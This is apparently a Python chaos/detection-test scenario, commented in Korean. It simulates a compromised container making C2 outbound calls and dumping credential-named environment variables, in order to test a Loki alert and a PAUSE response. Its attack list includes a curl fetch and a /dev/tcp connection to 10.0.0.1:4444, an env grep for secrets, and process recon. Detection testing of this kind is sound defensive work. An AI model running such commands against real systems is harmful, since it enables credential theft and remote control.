"""
category2_security/suspicious_process_exec.py
───────────────────────────────────────────────
침해된 컨테이너에서 C2 아웃바운드 연결 + 환경변수 탈취를 동시에 시도하는 시나리오.
프로세스 상태 보존(포렌식)이 필요한 상황 → PAUSE 케이스.

[secret_dump.py와의 차이]
- secret_dump:             환경변수 덤프 단독 → ISOLATE 케이스
- suspicious_process_exec: C2 연결 시도 + env 덤프 동시 → 포렌식 보존 필요 → PAUSE 케이스

[실제 사고 모티브]
- MITRE ATT&CK T1059: Command/Scripting Interpreter
- MITRE ATT&CK T1071: Application Layer Protocol (C2 통신)
- 2024년 다수 컨테이너 침해 사례: 침해 후 외부 C2 서버로 연결 + 크리덴셜 탈취

[로그 기록 방식]
- /proc/1/fd/1 (PID 1의 stdout)으로 강제 출력
  → backend 컨테이너 로그 → Fluentd → Loki 'suspicious_outbound' 패턴

탐지 포인트: SuspiciousProcessExec (Loki Ruler → Alertmanager → Pipeline)
탐지 조건:  {container="backend"} |~ "suspicious_outbound" 2분 내 발생
AIOps 포인트: 아웃바운드 + 환경변수 탈취 → 프로세스 동결(PAUSE)로 증거 보존
"""

import docker
import json
import os
import sys
from datetime import datetime, timezone

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from common.verifier import ScenarioVerifier, VerifyResult

# ── 설정 ──────────────────────────────────────────────────────────────────────
SCRIPT_DIR     = os.path.dirname(os.path.abspath(__file__))
LOG_PATH       = os.path.normpath(os.path.join(SCRIPT_DIR, "..", "logs", "anomaly_log.json"))
CONTAINER_NAME = "leafy-backend"

# /proc/1/fd/1 경유로 backend 로그에 'suspicious_outbound' 키워드 기록
# SuspiciousProcessExec 룰: {container="backend"} |~ "suspicious_outbound"
ATTACK_COMMANDS = [
    # C2 아웃바운드 연결 시도 (curl 없어도 /dev/tcp로 시도)
    (
        "echo '[ATTACK] suspicious_outbound curl_c2 10.0.0.1:4444' > /proc/1/fd/1 && "
        "(curl -s --connect-timeout 2 http://10.0.0.1:4444/shell 2>/dev/null || "
        " timeout 2 bash -c 'echo shell > /dev/tcp/10.0.0.1/4444' 2>/dev/null || "
        " echo '[ATTACK] suspicious_outbound c2_blocked' > /proc/1/fd/1)"
    ),
    # 환경변수 탈취 (크리덴셜 수집)
    (
        "echo '[ATTACK] suspicious_outbound env_exfil' > /proc/1/fd/1 && "
        "printenv | grep -i 'password\\|secret\\|token\\|key' | "
        "while read line; do echo \"[ATTACK] suspicious_outbound credential: ${line%%=*}\"; done > /proc/1/fd/1 || "
        "echo '[ATTACK] suspicious_outbound env_dump_complete' > /proc/1/fd/1"
    ),
    # 프로세스 정찰 (횡적 이동 준비)
    (
        "echo '[ATTACK] suspicious_outbound process_recon' > /proc/1/fd/1 && "
        "(ps aux 2>/dev/null | head -5 > /dev/null && "
        " echo '[ATTACK] suspicious_outbound recon_complete' > /proc/1/fd/1 || "
        " echo '[ATTACK] suspicious_outbound ps_unavailable' > /proc/1/fd/1)"
    ),
]


# ── 로그 유틸 ─────────────────────────────────────────────────────────────────
def _load_log() -> list:
    if os.path.exists(LOG_PATH) and os.path.getsize(LOG_PATH) > 0:
        with open(LOG_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    return []

def _save_log(records: list) -> None:
    os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
    with open(LOG_PATH, "w", encoding="utf-8") as f:
        json.dump(records, f, indent=2, ensure_ascii=False)

def record_event(scenario: str, start: str, end: str, status: str, detail: str = "") -> None:
    records = _load_log()
    records.append({
        "scenario": scenario, "category": "security",
        "start_time": start, "end_time": end,
        "status": status, "detail": detail,
    })
    _save_log(records)
    print(f"[LOG] {scenario} | {status} | {start} → {end}")


# ── 메인 ──────────────────────────────────────────────────────────────────────
def main():
    scenario = "suspicious_process_exec"
    client   = docker.from_env()

    verifier = ScenarioVerifier(
        scenario_name="suspicious_process_exec",
        alert_name="SuspiciousProcessExec",
        hypothesis=(
            "C2 아웃바운드 + env 덤프 시도 → "
            "Loki SuspiciousProcessExec 발화 → PAUSE 권고 패턴 생성"
        ),
    )

    verifier.check_steady_state()
    verifier.print_hypothesis()
    verifier.wait_for_alert_inactive(timeout=60, poll_interval=5)
    verifier.start_timer()

    print(f"\n[*] 시나리오: Suspicious Process Execution — PAUSE 케이스")
    print(f"[*] MITRE ATT&CK: T1059 (Command Exec) + T1071 (C2)")
    print(f"[*] 모델: Assumed Breach (컨테이너 침해 완료 가정)")
    print(f"[*] 대상: {CONTAINER_NAME}")
    print(f"[*] 탐지 목표: Loki 'suspicious_outbound' 패턴")
    print(f"[*] PAUSE vs ISOLATE: 아웃바운드 시도 = 포렌식 보존 필요 → PAUSE")

    start_time = datetime.now(timezone.utc).isoformat()

    try:
        container = client.containers.get(CONTAINER_NAME)
    except docker.errors.NotFound:
        end_time = datetime.now(timezone.utc).isoformat()
        record_event(scenario, start_time, end_time, "error",
                     f"컨테이너 '{CONTAINER_NAME}' 없음")
        print(f"[!] 컨테이너 '{CONTAINER_NAME}' 없음. 종료.", file=sys.stderr)
        sys.exit(1)

    results     = []
    any_success = False

    for cmd in ATTACK_COMMANDS:
        label = cmd.split("'")[1] if "'" in cmd else cmd[:60]
        print(f"\n[>] 공격 실행: {label}")
        try:
            exit_code, output = container.exec_run(
                cmd=["sh", "-c", cmd],
                stdout=True, stderr=True, stream=False,
            )
            # curl 연결 실패(exit=1,6,7)도 시도 자체는 성공
            success = exit_code in (0, 1, 6, 7)
            if success:
                any_success = True
            print(f"  → {'시도 완료' if success else '실패'} (exit={exit_code})")
            print(f"  → backend 로그에 'suspicious_outbound' 기록됨 → Loki 탐지 대기")
            results.append({"step": label[:50], "exit_code": exit_code, "success": success})
        except docker.errors.APIError as e:
            print(f"  [!] API 오류: {e}", file=sys.stderr)
            results.append({"step": label[:50], "error": str(e)})

    end_time     = datetime.now(timezone.utc).isoformat()
    final_status = "success" if any_success else "failed"
    record_event(scenario, start_time, end_time, final_status,
                 json.dumps(results, ensure_ascii=False)[:800])

    print(f"\n[*] 공격 시퀀스 완료. Loki 탐지 대기 중...")
    print(f"[*] Loki 쿼리: {{container=\"backend\"}} |~ \"suspicious_outbound\"")

    mttd = verifier.verify_loki(
        log_query='{container="backend"}',
        keyword="suspicious_outbound",
        timeout=120,
    )

    result = VerifyResult(
        success=mttd is not None,
        alert_name="SuspiciousProcessExec",
        scenario_name="suspicious_process_exec",
        mttd_seconds=mttd,
    )
    verifier.log_result(result)
    from common.result_viewer import ResultViewer
    ResultViewer("SuspiciousProcessExec", "suspicious_process_exec").show(
        mttd_seconds=result.mttd_seconds,
        mtta_seconds=result.mtta_seconds,
    )


SCENARIO_META = {
    "id":             "suspicious_process_exec",
    "label":          "의심 프로세스 실행",
    "subtitle":       "C2 연결 시도 + env 덤프  ·  PAUSE 케이스",
    "category":       "보안",
    "owasp":          "A02:2021",
    "mitre":          "T1059",
    "container":      "leafy-backend",
    "loki_container": "backend",
    "alert_name":     "SuspiciousProcessExec",
    "alert_fires":    True,
    "blind_spot":     False,
    "module":         "category2_security.suspicious_process_exec",
    "custom_panel":   None,
}

if __name__ == "__main__":
    main()
